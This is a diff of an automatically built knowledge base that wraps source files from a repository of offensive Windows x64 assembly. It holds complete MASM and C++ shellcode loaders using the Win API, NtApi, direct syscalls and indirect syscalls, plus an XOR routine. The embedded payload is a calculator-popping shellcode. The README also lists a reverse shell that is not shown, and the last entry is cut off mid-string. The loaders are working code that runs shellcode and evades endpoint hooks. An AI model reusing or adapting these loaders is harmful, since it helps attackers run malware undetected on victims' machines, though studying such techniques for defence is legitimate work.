-    "source:578f0653567fea44abd73d": "## alloc.asm\n\nThe assembly code defines a procedure for memory allocation, memory copying, and memory protection using Windows API functions.\n\n---\n\nextern VirtualAlloc: proc\nextern RtlMoveMemory: proc\nextern VirtualProtect: proc\n\n.data\nmyMemory dq ?\noldProtect dd 0\n\n.code\nAllocate proc\n; Setup Stack (Shadow space 32 bytes + 16 bytes padding = 48/30h)\n sub rsp, 30h \n mov rbx, rcx \n\n; VirtualAlloc(0, 1024, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)\n xor rcx, rcx \n mov rdx, 1024 \n mov r8, 3000h \n mov r9, 4h \n call VirtualAlloc\n \n test rax, rax \n jz exit_proc\n mov myMemory, rax \n\n;RtlMoveMemory(myMemory, payload_ptr, 205)\n mov rcx, rax \n mov rdx, rbx \n mov r8, 205 \n call RtlMoveMemory\n\n;VirtualProtect(myMemory, 205, PAGE_EXECUTE_READ, &oldProtect)\n mov rcx, myMemory \n mov rdx, 205 \n mov r8, 20h \n lea r9, [oldProtect] \n call VirtualProtect\n\n test rax, rax \n jz exit_proc\n; We ensure RSP is 16-byte aligned before jumping to the payload\n and rsp, -16 \n \n; Execute the Memory Block\n call myMemory \n\nexit_proc:\n add rsp, 30h\n ret\nAllocate endp\nend\n\n## Concepts\n\n- **VirtualAlloc:** A Windows API function for memory allocation.\n- **RtlMoveMemory:** A Windows API function for memory copying.\n- **VirtualProtect:** A Windows API function for changing memory protection.\n\n## Techniques\n\n- **Memory Allocation and Execution:** Allocating memory with specific permissions and executing code within it.\n\n## Explicit entities\n\n- VirtualAlloc (api)\n- RtlMoveMemory (api)\n- VirtualProtect (api)\n\n---\n\n*Automatic ingestion status: complete*",
-    "concept:2e36a0544dd37262a43501": "## VirtualAlloc\n\nA Windows API function for memory allocation.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **alloc.asm**.",
-    "concept:44d6d188153458c5805fc2": "## RtlMoveMemory\n\nA Windows API function for memory copying.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **alloc.asm**.",
-    "concept:c31158beb7d51159d0a637": "## VirtualProtect\n\nA Windows API function for changing memory protection.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **alloc.asm**.",
-    "technique:b4050f6a5254e804df5bc9": "## Memory Allocation and Execution\n\nAllocating memory with specific permissions and executing code within it.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **alloc.asm**.",
-    "source:da84ab5dc563d46e3edfb7": "## main.cpp\n\nThe C++ code demonstrates the use of an external assembly procedure to execute a payload stored in memory.\n\n---\n\nextern \"C\" void Allocate(unsigned char* payload);\n\n\n// popcalc https://www.exploit-db.com/shellcodes/49819\nunsigned char payload[] = \"\\x48\\x31\\xff\\x48\\xf7\\xe7\\x65\\x48\\x8b\\x58\\x60\\x48\\x8b\\x5b\\x18\\x48\\x8b\\x5b\\x20\\x48\\x8b\\x1b\\x48\\x8b\\x1b\\x48\\x8b\\x5b\\x20\\x49\\x89\\xd8\\x8b\"\n \"\\x5b\\x3c\\x4c\\x01\\xc3\\x48\\x31\\xc9\\x66\\x81\\xc1\\xff\\x88\\x48\\xc1\\xe9\\x08\\x8b\\x14\\x0b\\x4c\\x01\\xc2\\x4d\\x31\\xd2\\x44\\x8b\\x52\\x1c\\x4d\\x01\\xc2\"\n \"\\x4d\\x31\\xdb\\x44\\x8b\\x5a\\x20\\x4d\\x01\\xc3\\x4d\\x31\\xe4\\x44\\x8b\\x62\\x24\\x4d\\x01\\xc4\\xeb\\x32\\x5b\\x59\\x48\\x31\\xc0\\x48\\x89\\xe2\\x51\\x48\\x8b\"\n \"\\x0c\\x24\\x48\\x31\\xff\\x41\\x8b\\x3c\\x83\\x4c\\x01\\xc7\\x48\\x89\\xd6\\xf3\\xa6\\x74\\x05\\x48\\xff\\xc0\\xeb\\xe6\\x59\\x66\\x41\\x8b\\x04\\x44\\x41\\x8b\\x04\"\n \"\\x82\\x4c\\x01\\xc0\\x53\\xc3\\x48\\x31\\xc9\\x80\\xc1\\x07\\x48\\xb8\\x0f\\xa8\\x96\\x91\\xba\\x87\\x9a\\x9c\\x48\\xf7\\xd0\\x48\\xc1\\xe8\\x08\\x50\\x51\\xe8\\xb0\"\n \"\\xff\\xff\\xff\\x49\\x89\\xc6\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x50\\x48\\xb8\\x9c\\x9e\\x93\\x9c\\xd1\\x9a\\x87\\x9a\\x48\\xf7\\xd0\\x50\\x48\\x89\\xe1\\x48\\xff\\xc2\"\n \"\\x48\\x83\\xec\\x20\\x41\\xff\\xd6\";\n\nint main() {\n\tAllocate(payload);\n\treturn 0;\n}\n\n## Concepts\n\n- **Memory Execution:** A method to execute code stored in memory.\n\n## Techniques\n\n- **Memory Execution:** Executing code stored in memory through an external function.\n\n## Explicit entities\n\n- Allocate (function)\n\n---\n\n*Automatic ingestion status: complete*",
-    "concept:496018fecb3d63107c5965": "## Memory Execution\n\nA method to execute code stored in memory.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **main.cpp**.",
-    "technique:496018fecb3d63107c5965": "## Memory Execution\n\nExecuting code stored in memory through an external function.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **main.cpp**.",
-    "source:2b4e9844e8b33987159cfe": "## main.cpp\n\nThe C++ code demonstrates the use of native Windows API functions for memory management and execution.\n\n---\n\n#pragma once\n#include <Windows.h>\n\n#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)\n\n\nEXTERN_C NTSTATUS NtAllocateVirtualMemory(\n HANDLE ProcessHandle,\n PVOID* BaseAddress,\n ULONG_PTR ZeroBits,\n PSIZE_T RegionSize,\n ULONG AllocationType,\n ULONG Protect\n);\n\nEXTERN_C NTSTATUS NtProtectVirtualMemory(\n IN HANDLE ProcessHandle,\n IN OUT PVOID* BaseAddress,\n IN OUT PSIZE_T RegionSize,\n IN ULONG NewProtect,\n OUT PULONG OldProtect);\n\nEXTERN_C NTSTATUS NtWriteVirtualMemory(\n IN HANDLE ProcessHandle,\n IN PVOID BaseAddress,\n IN PVOID Buffer,\n IN SIZE_T NumberOfBytesToWrite,\n OUT PSIZE_T NumberOfBytesWritten OPTIONAL\n);\nHMODULE NtdllHandle = NULL;\n\n// from [private-source]\n\nVOID GetSyscallNumber(\n _In_ HMODULE NtdllHandle,\n _In_ LPCSTR NtFunctionName,\n _Out_ PDWORD NtFunctionSSN\n) {\n\n UINT_PTR NtFunctionAddress = 0;\n\n NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);\n\n *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];\n return;\n\n}\n\nextern \"C\" {\n DWORD g_NtAllocateVirtualMemorySSN = 0;\n DWORD g_NtWriteVirtualMemorySSN = 0;\n DWORD g_NtProtectVirtualMemorySSN = 0;\n}\nextern \"C\" void NtSyscalls(HANDLE handle, unsigned char* payload);\n\n\n// popcalc https://www.exploit-db.com/shellcodes/49819\nunsigned char payload[] = \"\\x48\\x31\\xff\\x48\\xf7\\xe7\\x65\\x48\\x8b\\x58\\x60\\x48\\x8b\\x5b\\x18\\x48\\x8b\\x5b\\x20\\x48\\x8b\\x1b\\x48\\x8b\\x1b\\x48\\x8b\\x5b\\x20\\x49\\x89\\xd8\\x8b\"\n\"\\x5b\\x3c\\x4c\\x01\\xc3\\x48\\x31\\xc9\\x66\\x81\\xc1\\xff\\x88\\x48\\xc1\\xe9\\x08\\x8b\\x14\\x0b\\x4c\\x01\\xc2\\x4d\\x31\\xd2\\x44\\x8b\\x52\\x1c\\x4d\\x01\\xc2\"\n\"\\x4d\\x31\\xdb\\x44\\x8b\\x5a\\x20\\x4d\\x01\\xc3\\x4d\\x31\\xe4\\x44\\x8b\\x62\\x24\\x4d\\x01\\xc4\\xeb\\x32\\x5b\\x59\\x48\\x31\\xc0\\x48\\x89\\xe2\\x51\\x48\\x8b\"\n\"\\x0c\\x24\\x48\\x31\\xff\\x41\\x8b\\x3c\\x83\\x4c\\x01\\xc7\\x48\\x89\\xd6\\xf3\\xa6\\x74\\x05\\x48\\xff\\xc0\\xeb\\xe6\\x59\\x66\\x41\\x8b\\x04\\x44\\x41\\x8b\\x04\"\n\"\\x82\\x4c\\x01\\xc0\\x53\\xc3\\x48\\x31\\xc9\\x80\\xc1\\x07\\x48\\xb8\\x0f\\xa8\\x96\\x91\\xba\\x87\\x9a\\x9c\\x48\\xf7\\xd0\\x48\\xc1\\xe8\\x08\\x50\\x51\\xe8\\xb0\"\n\"\\xff\\xff\\xff\\x49\\x89\\xc6\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x50\\x48\\xb8\\x9c\\x9e\\x93\\x9c\\xd1\\x9a\\x87\\x9a\\x48\\xf7\\xd0\\x50\\x48\\x89\\xe1\\x48\\xff\\xc2\"\n\"\\x48\\x83\\xec\\x20\\x41\\xff\\xd6\";\n\nint main() {\n \n\n NtdllHandle = GetModuleHandleW(L\"NTDLL\");\n\n GetSyscallNumber(NtdllHandle, \"NtAllocateVirtualMemory\", &g_NtAllocateVirtualMemorySSN);\n GetSyscallNumber(NtdllHandle, \"NtWriteVirtualMemory\", &g_NtWriteVirtualMemorySSN);\n GetSyscallNumber(NtdllHandle, \"NtProtectVirtualMemory\", &g_NtProtectVirtualMemorySSN);\n \n NtSyscalls(NtCurrentProcess(), payload);\n return 0;\n}\n\n## Concepts\n\n- **NtAllocateVirtualMemory:** A Windows API function for memory allocation.\n- **NtProtectVirtualMemory:** A Windows API function for memory protection.\n- **NtWriteVirtualMemory:** A Windows API function for writing to virtual memory.\n\n## Techniques\n\n- **Memory Management:** Allocating and managing memory using native Windows API functions.\n\n## Explicit entities\n\n- NtAllocateVirtualMemory (api)\n- NtProtectVirtualMemory (api)\n- NtWriteVirtualMemory (api)\n\n---\n\n*Automatic ingestion status: complete*",
-    "concept:272449e09f1edfba17e604": "## NtAllocateVirtualMemory\n\nA system call for memory allocation.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **syscalls.asm**.",
-    "concept:d926eda4be4c1eaf263e4f": "## NtProtectVirtualMemory\n\nA system call for changing memory protection.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **syscalls.asm**.",
-    "concept:d9a163920d91e7e098502d": "## NtWriteVirtualMemory\n\nA system call for writing to memory.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **syscalls.asm**.",
-    "technique:f6bb6a6d43b07f4783380c": "## Memory Management\n\nAllocating and managing memory using native Windows API functions.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **main.cpp**.",
-    "source:fc45cf0d02ec691729957a": "## syscalls.asm\n\nThe assembly code defines procedures for system calls to manage memory allocation, writing, and protection.\n\n---\n\nEXTRN g_NtAllocateVirtualMemorySSN:DWORD\nEXTRN g_NtWriteVirtualMemorySSN:DWORD\nEXTRN g_NtProtectVirtualMemorySSN:DWORD\n\n.data\nmyMemory dq ?\noldProtect dq 0\ndwSize dq 1024\nBytesWritten dq ?\n\n.code\n\nNtAllocateVirtualMemory proc \n mov r10, rcx\n mov eax, g_NtAllocateVirtualMemorySSN \n syscall \n ret \nNtAllocateVirtualMemory endp\n\nNtWriteVirtualMemory proc \n mov r10, rcx\n mov eax, g_NtWriteVirtualMemorySSN \n syscall \n ret \nNtWriteVirtualMemory endp \n\nNtProtectVirtualMemory proc\n mov r10, rcx\n mov eax, g_NtProtectVirtualMemorySSN \n syscall\n ret \nNtProtectVirtualMemory endp\n\n\nNtSyscalls proc\n; 1. Save non-volatile registers used in this function (Windows x64 requirement)\n push rbx\n push r12\n push rsi; keeping 16-byte alignment (3 pushes = 24 bytes, plus 8 for return address = 32 bytes)\n\n; Setup standard 32-byte shadow space for our calls\n sub rsp, 20h \n\n mov rbx, rdx \n mov r12, rcx \n\n mov rcx, r12\n lea rdx, [myMemory]\n xor r8, r8\n lea r9, [dwSize] \n mov qword ptr [rsp + 20h], 3000h \n mov qword ptr [rsp + 28h], 04h \n call NtAllocateVirtualMemory\n \n \n mov rcx, r12\n mov rdx, myMemory \n mov r8, rbx \n mov r9, dwSize\n lea r11, [BytesWritten]\n mov qword ptr [rsp + 20h], r11 \n call NtWriteVirtualMemory\n \n mov rcx, r12\n lea rdx, [myMemory]\n lea r8, [dwSize] \n mov r9, 20h \n lea r11, [oldProtect] \n mov qword ptr [rsp + 20h], r11 \n call NtProtectVirtualMemory\n\n; Clean up shadow space stack allocation\n add rsp, 20h\n\n; Restore non-volatile registers\n pop rsi\n pop r12\n pop rbx\n\n; Ensure 16-byte alignment before jumping to shellcode payload\n and rsp, -16 \n \n; Execute the allocated & unlocked Memory Block\n call qword ptr [myMemory] \n\n ret\nNtSyscalls endp\n\nend\n\n## Concepts\n\n- **NtAllocateVirtualMemory:** A system call for memory allocation.\n- **NtWriteVirtualMemory:** A system call for writing to memory.\n- **NtProtectVirtualMemory:** A system call for changing memory protection.\n\n## Techniques\n\n- **System Call Memory Management:** Using system calls for memory allocation and execution.\n\n## Explicit entities\n\n- NtAllocateVirtualMemory (function)\n- NtWriteVirtualMemory (function)\n- NtProtectVirtualMemory (function)\n\n---\n\n*Automatic ingestion status: complete*",
-    "technique:1b570c45d3906a8b3c55ba": "## System Call Memory Management\n\nUsing system calls for memory allocation and execution.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **syscalls.asm**.",
-    "source:85c72a8be5174c476cb803": "## main.cpp\n\nThe C++ code demonstrates a simple XOR encryption and decryption mechanism using an external assembly function.\n\n---\n\n#include <iostream>\n\nusing namespace std;\nextern \"C\" void XorIt(unsigned char* data, const char* key, size_t dataSize, size_t keySize);\n\nint main() {\n\tunsigned char data[] = \"Hello\";\n\tconst char* key = \"test\";\n\n\tXorIt(data, key, sizeof(data) - 1, strlen(key));\n\tcout<<\"Encrypted: \" << data << endl;\n\tXorIt(data, key, sizeof(data) - 1, strlen(key));\n\tcout << \"Decrypted: \" << data << endl;\n\n}\n\n## Concepts\n\n- **XOR Encryption:** A method for encrypting and decrypting data using XOR operation.\n\n## Techniques\n\n- **XOR Encryption:** Encrypting and decrypting data using XOR operation.\n\n## Explicit entities\n\n- XorIt (function)\n\n---\n\n*Automatic ingestion status: complete*",
-    "concept:23b325dc2837ba82363c30": "## XOR Encryption\n\nA method for encrypting and decrypting data using XOR operation.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **xorit.asm**.",
-    "technique:23b325dc2837ba82363c30": "## XOR Encryption\n\nEncrypting and decrypting data using XOR operation.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **xorit.asm**.",
-    "source:39cbdb4b4a246e712ac6fe": "## xorit.asm\n\nThe assembly code defines a procedure for XOR-based encryption and decryption.\n\n---\n\n.data\n\n.code\n\nXorIt proc\n\tmov r10, rcx\n\tmov r11, rdx\n\tpush r12\n\tlea r12, [rdx+r9]\n\t\nloopxor:\n cmp r8, 0\n je done\n \n mov al, [r10]\n xor al, [r11]\n mov [r10], al\n \n inc r10\n inc r11\n dec r8\n \n cmp r11, r12\n jne loopxor\n \n mov r11, rdx\n \n jmp loopxor\ndone:\n pop r12\n\tret\nXorIt endp\nend\n\n## Concepts\n\n- **XOR Encryption:** A method for encrypting and decrypting data using XOR operation.\n\n## Techniques\n\n- **XOR Encryption:** Encrypting and decrypting data using XOR operation.\n\n## Explicit entities\n\n- XorIt (function)\n\n---\n\n*Automatic ingestion status: complete*",
-    "source:86add4df83091a2fab4222": "## README.md\n\nThis record describes a collection of offensive Windows x64 assembly programs, implemented as Visual Studio projects using MASM and C. The programs include various shellcode loaders (Win API, NtApi, Syscalls, Indirect Syscalls), a basic XOR encryption tool, and a reverse shell leveraging WinSock and CreateProcessA. The assembly functions are invoked from C, with some C code used for function resolution. The record credits external tutorials and sources for guidance.\n\n---\n\n# Offensive Windows x64 Assembly\n\nCollection of programs I made while learning assembly. They are Visual studio projects that use masm as build dependency and the assembly functions are called in C and then are given the necessary arguments.\n\n* Win API shellcode loader\n* NtApi Shellcode loader\n* Syscalls Shellcode loader (with some code in C to resolve functions)\n* Indirect Syscalls Shellcode loader\n* Basic Xor encryption program\n* Reverse Shell using WinSock and CreateProcessA\n\n# Credits\n[Creel Dynamic Memory Assembly Tutorial](https://www.youtube.com/watch?v=vJPwAjJN2Yg&list=LL)\n\n[Cr-0w Source B Loaders in C]([private-source])\n\n## Concepts\n\n- **Offensive Windows x64 Assembly Programs:** A set of programs designed for Source C tasks on Windows x64, focusing on assembly language and integration with C.\n- **Assembly and C Integration:** The use of assembly functions called from C code, with MASM as a build dependency, to implement offensive techniques.\n\n## Techniques\n\n- **Shellcode Loading via Windows APIs and Syscalls:** Loading shellcode using various Windows APIs, including Win API, NtApi, Syscalls, and Indirect Syscalls.\n- **Reverse Shell using WinSock and CreateProcessA:** Implementing a reverse shell by leveraging WinSock for network communication and CreateProcessA for process creation.\n- **Basic XOR Encryption:** Encrypting data using a basic XOR encryption program.\n\n## Explicit entities\n\n- Win API shellcode loader (tool)\n- NtApi Shellcode loader (tool)\n- Syscalls Shellcode loader (tool)\n- Indirect Syscalls Shellcode loader (tool)\n- Basic Xor encryption program (tool)\n- Reverse Shell (tool)\n- WinSock (library)\n- CreateProcessA (api)\n- MASM (library)\n- Visual Studio (product)\n\n---\n\n*Automatic ingestion status: complete*",
-    "concept:b8057e07146fcfa598448c": "## Offensive Windows x64 Assembly Programs\n\nA set of programs designed for Source C tasks on Windows x64, focusing on assembly language and integration with C.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **README.md**.",
-    "concept:66e410ddc02aa1db7160f6": "## Assembly and C Integration\n\nThe use of assembly functions called from C code, with MASM as a build dependency, to implement offensive techniques.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **README.md**.",
-    "technique:0ef452b667ebe0ff2732be": "## Shellcode Loading via Windows APIs and Syscalls\n\nLoading shellcode using various Windows APIs, including Win API, NtApi, Syscalls, and Indirect Syscalls.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **README.md**.",
-    "technique:c08748fd1f833da2f24ba1": "## Reverse Shell using WinSock and CreateProcessA\n\nImplementing a reverse shell by leveraging WinSock for network communication and CreateProcessA for process creation.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **README.md**.",
-    "technique:db6982f933bff779e1a13e": "## Basic XOR Encryption\n\nEncrypting data using a basic XOR encryption program.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **README.md**."
+    "source:bb4faa95ea190a9b879b27": "## indirect.asm\n\nThis assembly code outlines procedures for interacting with Windows kernel functions to manage virtual memory. It includes functions like NtAllocateVirtualMemory, NtWriteVirtualMemory, and NtProtectVirtualMemory, along with an indirect syscall mechanism that sets up shadow space for these calls before executing a memory block.\n\n---\n\nextern g_NtAllocateVirtualMemorySSN:DWORD\nextern g_NtAllocateVirtualMemorySyscall:QWORD\nextern g_NtWriteVirtualMemorySSN:DWORD\nextern g_NtWriteVirtualMemorySyscall:QWORD\nextern g_NtProtectVirtualMemorySSN:DWORD\nextern g_NtProtectVirtualMemorySyscall:QWORD\n\n.data\nmyMemory dq ?\noldProtect dq 0\ndwSize dq 1024\nBytesWritten dq ?\n\n.code\n\nNtAllocateVirtualMemory proc\n mov r10, rcx\n mov eax, g_NtAllocateVirtualMemorySSN\n jmp qword ptr g_NtAllocateVirtualMemorySyscall \n ret \nNtAllocateVirtualMemory endp\n\nNtWriteVirtualMemory proc\n mov r10, rcx\n mov eax, g_NtWriteVirtualMemorySSN \n jmp qword ptr g_NtWriteVirtualMemorySyscall \n ret \nNtWriteVirtualMemory endp\n\nNtProtectVirtualMemory proc\n mov r10, rcx\n mov eax, g_NtProtectVirtualMemorySSN \n jmp qword ptr g_NtProtectVirtualMemorySyscall \n ret \nNtProtectVirtualMemory endp\n\n\n\nNtIndirectSyscalls proc\n; 1. Save non-volatile registers used in this function (Windows x64 requirement)\n push rbx\n push r12\n push rsi; keeping 16-byte alignment (3 pushes = 24 bytes, plus 8 for return address = 32 bytes)\n\n; Setup standard 32-byte shadow space for our calls\n sub rsp, 20h \n\n mov rbx, rdx\n mov r12, rcx \n\n mov rcx, r12\n lea rdx, [myMemory]\n xor r8, r8\n lea r9, [dwSize] \n mov qword ptr [rsp + 20h], 3000h \n mov qword ptr [rsp + 28h], 04h \n call NtAllocateVirtualMemory\n \n \n mov rcx, r12\n mov rdx, myMemory \n mov r8, rbx \n mov r9, dwSize\n lea r11, [BytesWritten]\n mov qword ptr [rsp + 20h], r11 \n call NtWriteVirtualMemory\n \n mov rcx, r12\n lea rdx, [myMemory]\n lea r8, [dwSize] \n mov r9, 20h \n lea r11, [oldProtect] \n mov qword ptr [rsp + 20h], r11 \n call NtProtectVirtualMemory\n\n; Clean up shadow space stack allocation\n add rsp, 20h\n\n; Restore non-volatile registers\n pop rsi\n pop r12\n pop rbx\n\n; Ensure 16-byte alignment before jumping to shellcode payload\n and rsp, -16 \n \n; Execute the allocated & unlocked Memory Block\n call qword ptr [myMemory] \n\n ret\nNtIndirectSyscalls endp\n\nend\n\n## Explicit entities\n\n- g_NtAllocateVirtualMemorySSN (other)\n- g_NtWriteVirtualMemorySyscall (other)\n- g_NtProtectVirtualMemorySSN (other)\n- NtAllocateVirtualMemory (other)\n- NtWriteVirtualMemory (other)\n- NtProtectVirtualMemory (other)\n\n---\n\n*Automatic ingestion status: degraded*",
+    "source:bef414c9b57c6df7512c22": "## main.cpp\n\nThis C++ file implements an indirect system call technique by retrieving function addresses via GetProcAddress and constructing syscall signatures. It defines functions for allocating, writing, and protecting virtual memory using native NTDLL functions. The main function orchestrates these calls to execute a payload via NtIndirectSyscalls.\n\n---\n\n#pragma once\n#include <windows.h>\n\n#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)\n\ntypedef unsigned __int64 QWORD;\n\nEXTERN_C NTSTATUS NtAllocateVirtualMemory(\n HANDLE ProcessHandle,\n PVOID* BaseAddress,\n ULONG_PTR ZeroBits,\n PSIZE_T RegionSize,\n ULONG AllocationType,\n ULONG Protect\n);\n\nEXTERN_C NTSTATUS NtProtectVirtualMemory(\n IN HANDLE ProcessHandle,\n IN OUT PVOID* BaseAddress,\n IN OUT PSIZE_T RegionSize,\n IN ULONG NewProtect,\n OUT PULONG OldProtect);\n\nEXTERN_C NTSTATUS NtWriteVirtualMemory(\n IN HANDLE ProcessHandle,\n IN PVOID BaseAddress,\n IN PVOID Buffer,\n IN SIZE_T NumberOfBytesToWrite,\n OUT PSIZE_T NumberOfBytesWritten OPTIONAL\n);\nHMODULE NtdllHandle = NULL;\n\n// from [private-source]\n\nVOID IndirectPrelude(\n _In_ HMODULE NtdllHandle,\n _In_ LPCSTR NtFunctionName,\n _Out_ PDWORD NtFunctionSSN,\n _Out_ PUINT_PTR NtFunctionSyscall\n) {\n\n DWORD SyscallNumber = 0;\n UINT_PTR NtFunctionAddress = 0;\n UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };\n\n NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);\n \n\n // Read the 4th and 5th bytes, as the system call numbers occupy 2 bytes\n BYTE byte4 = ((PBYTE)NtFunctionAddress)[4];\n BYTE byte5 = ((PBYTE)NtFunctionAddress)[5];\n *NtFunctionSSN = (byte5 << 8) | byte4; // Combine to a single DWORD\n\n *NtFunctionSyscall = NtFunctionAddress + 0x12;\n\n memcmp(SyscallOpcodes, (PVOID)*NtFunctionSyscall, sizeof(SyscallOpcodes));\n return;\n \n}\n\nextern \"C\" {\n DWORD g_NtAllocateVirtualMemorySSN = 0;\n QWORD g_NtAllocateVirtualMemorySyscall = 0;\n DWORD g_NtWriteVirtualMemorySSN = 0;\n QWORD g_NtWriteVirtualMemorySyscall = 0;\n DWORD g_NtProtectVirtualMemorySSN = 0;\n QWORD g_NtProtectVirtualMemorySyscall = 0;\n}\nextern \"C\" void NtIndirectSyscalls(HANDLE handle, unsigned char* payload);\n\n\n// popcalc https://www.exploit-db.com/shellcodes/49819\nunsigned char payload[] = \"\\x48\\x31\\xff\\x48\\xf7\\xe7\\x65\\x48\\x8b\\x58\\x60\\x48\\x8b\\x5b\\x18\\x48\\x8b\\x5b\\x20\\x48\\x8b\\x1b\\x48\\x8b\\x1b\\x48\\x8b\\x5b\\x20\\x49\\x89\\xd8\\x8b\"\n \"\\x5b\\x3c\\x4c\\x01\\xc3\\x48\\x31\\xc9\\x66\\x81\\xc1\\xff\\x88\\x48\\xc1\\xe9\\x08\\x8b\\x14\\x0b\\x4c\\x01\\xc2\\x4d\\x31\\xd2\\x44\\x8b\\x52\\x1c\\x4d\\x01\\xc2\"\n \"\\x4d\\x31\\xdb\\x44\\x8b\\x5a\\x20\\x4d\\x01\\xc3\\x4d\\x31\\xe4\\x44\\x8b\\x62\\x24\\x4d\\x01\\xc4\\xeb\\x32\\x5b\\x59\\x48\\x31\\xc0\\x48\\x89\\xe2\\x51\\x48\\x8b\"\n \"\\x0c\\x24\\x48\\x31\\xff\\x41\\x8b\\x3c\\x83\\x4c\\x01\\xc7\\x48\\x89\\xd6\\xf3\\xa6\\x74\\x05\\x48\\xff\\xc0\\xeb\\xe6\\x59\\x66\\x41\\x8b\\x04\\x44\\x41\\x8b\\x04\"\n \"\\x82\\x4c\\x01\\xc0\\x53\\xc3\\x48\\x31\\xc9\\x80\\xc1\\x07\\x48\\xb8\\x0f\\xa8\\x96\\x91\\xba\\x87\\x9a\\x9c\\x48\\xf7\\xd0\\x48\\xc1\\xe8\\x08\\x50\\x51\\xe8\\xb0\"\n \"\\xff\\xff\\xff\\x49\\x89\\xc6\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x50\\x48\\xb8\\x9c\\x9e\\x93\\x9c\\xd1\\x9a\\x87\\x9a\\x48\\xf7\\xd0\\x50\\x48\\x89\\xe1\\x48\\xff\\xc2\"\n \"\\x48\\x83\\xec\\x20\\x41\\xff\\xd6\";\n\nint main() {\n\n NtdllHandle = GetModuleHandleW(L\"NTDLL\");\n\n IndirectPrelude(NtdllHandle, \"NtAllocateVirtualMemory\", &g_NtAllocateVirtualMemorySSN, &g_NtAllocateVirtualMemorySyscall);\n IndirectPrelude(NtdllHandle, \"NtWriteVirtualMemory\", &g_NtWriteVirtualMemorySSN, &g_NtWriteVirtualMemorySyscall);\n IndirectPrelude(NtdllHandle, \"NtProtectVirtualMemory\", &g_NtProtectVirtualMemorySSN, &g_NtProtectVirtualMemorySyscall);\n\n NtIndirectSyscalls(NtCurrentProcess(), payload);\n return 0;\n}\n\n## Explicit entities\n\n- NtProtectVirtualMemory (other)\n- NtIndirectSyscalls (other)\n\n---\n\n*Automatic ingestion status: degraded*",
+    "source:3def7075e3e7d6af5673bf": "## main.cpp\n\n#include <Windows.h> #pragma comment(lib, \"ntdll\") #define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1) EXTERN_C NTSTATUS NtAllocateVirtualMemory( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect ); EXTERN_C NTSTATUS NtProtectVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG Ol\n\n---\n\n#include <Windows.h>\n\n#pragma comment(lib, \"ntdll\")\n\n#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)\n\nEXTERN_C NTSTATUS NtAllocateVirtualMemory(\n HANDLE ProcessHandle,\n PVOID* BaseAddress,\n ULONG_PTR ZeroBits,\n PSIZE_T RegionSize,\n ULONG AllocationType,\n ULONG Protect\n);\n\nEXTERN_C NTSTATUS NtProtectVirtualMemory(\n IN HANDLE ProcessHandle,\n IN OUT PVOID* BaseAddress,\n IN OUT PSIZE_T RegionSize,\n IN ULONG NewProtect,\n OUT PULONG OldProtect);\n\nEXTERN_C NTSTATUS NtWriteVirtualMemory(\n IN HANDLE ProcessHandle,\n IN PVOID BaseAddress,\n IN PVOID Buffer,\n IN SIZE_T NumberOfBytesToWrite,\n OUT PSIZE_T NumberOfBytesWritten OPTIONAL\n );\n\nextern \"C\" void NtApi(HANDLE handle, unsigned char* payload);\n\n\n// popcalc https://www.exploit-db.com/shellcodes/49819\nunsigned char payload[] = \"\\x48\\x31\\xff\\x48\\xf7\\xe7\\x65\\x48\\x8b\\x58\\x60\\x48\\x8b\\x5b\\x18\\x48\\x8b\\x5b\\x20\\x48\\x8b\\x1b\\x48\\x8b\\x1b\\x48\\x8b\\x5b\\x20\\x49\\x89\\xd8\\x8b\"\n\"\\x5b\\x3c\\x4c\\x01\\xc3\\x48\\x31\\xc9\\x66\\x81\\xc1\\xff\\x88\\x48\\xc1\\xe9\\x08\\x8b\\x14\\x0b\\x4c\\x01\\xc2\\x4d\\x31\\xd2\\x44\\x8b\\x52\\x1c\\x4d\\x01\\xc2\"\n\"\\x4d\\x31\\xdb\\x44\\x8b\\x5a\\x20\\x4d\\x01\\xc3\\x4d\\x31\\xe4\\x44\\x8b\\x62\\x24\\x4d\\x01\\xc4\\xeb\\x32\\x5b\\x59\\x48\\x31\\xc0\\x48\\x89\\xe2\\x51\\x48\\x8b\"\n\"\\x0c\\x24\\x48\\x31\\xff\\x41\\x8b\\x3c\\x83\\x4c\\x01\\xc7\\x48\\x89\\xd6\\xf3\\xa6\\x74\\x05\\x48\\xff\\xc0\\xeb\\xe6\\x59\\x66\\x41\\x8b\\x04\\x44\\x41\\x8b\\x04\"\n\"\\x82\\x4c\\x01\\xc0\\x53\\xc3\\x48\\x31\\xc9\\x80\\xc1\\x07\\x48\\xb8\\x0f\\xa8\\x96\\x91\\xba\\x87\\x9a\\x9c\\x48\\xf7\\xd0\\x48\\xc1\\xe8\\x08\\x50\\x51\\xe8\\xb0\"\n\"\\xff\\xff\\xff\\x49\\x89\\